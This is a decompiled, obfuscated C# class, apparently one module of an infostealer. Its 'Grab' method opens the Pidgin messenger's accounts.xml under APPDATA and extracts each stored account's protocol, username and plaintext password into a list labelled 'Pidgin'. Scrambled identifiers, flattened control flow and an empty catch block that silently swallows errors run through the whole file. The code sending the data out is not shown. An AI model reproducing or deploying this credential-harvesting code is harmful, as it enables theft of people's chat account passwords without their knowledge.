using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using C6Zy;
using JSW1fecBOy;

namespace rk937aHHc
{
	// Token: 0x02000045 RID: 69
	public class 2cZ074xRxv : EtbH
	{
		// Token: 0x0600013A RID: 314 RVA: 0x0000755D File Offset: 0x0000575D
		public 2cZ074xRxv()
		{
			this.2Y8h = "Pidgin";
		}

		// Token: 0x17000035 RID: 53
		// (get) Token: 0x0600013B RID: 315 RVA: 0x00007575 File Offset: 0x00005775
		// (set) Token: 0x0600013C RID: 316 RVA: 0x0000757D File Offset: 0x0000577D
		public string 2Y8h { get; set; }

		// Token: 0x0600013D RID: 317 RVA: 0x0001ACE4 File Offset: 0x00018EE4
		public List<WTitxI2m> Grab()
		{
			int num = 0;
			List<WTitxI2m> list;
			while (num != 2)
			{
				if (num == 1)
				{
					list = new List<WTitxI2m>();
					num = 2;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 3)
				{
					List<WTitxI2m> result;
					return result;
				}
			}
			try
			{
				string path = Environment.GetEnvironmentVariable("APPDATA") + "\\.purple\\accounts.xml";
				if (!File.Exists(path))
				{
					return new List<WTitxI2m>();
				}
				string text = File.ReadAllText(Environment.GetEnvironmentVariable("APPDATA") + "\\.purple\\accounts.xml");
				int count = Regex.Matches(text, Regex.Escape("<account>")).Count;
				for (int i = 0; i < count; i++)
				{
					string host = g3Vt7T2gk5.1b9(text, "<protocol>", "</protocol>", i);
					string username = g3Vt7T2gk5.1b9(text, "<name>", "</name>", i);
					string password = g3Vt7T2gk5.1b9(text, "<password>", "</password>", i);
					list.Add(new WTitxI2m
					{
						data1 = host,
						data2 = username,
						data3 = password,
						data4 = this.2Y8h
					});
				}
			}
			catch
			{
			}
			return list;
		}
	}
}
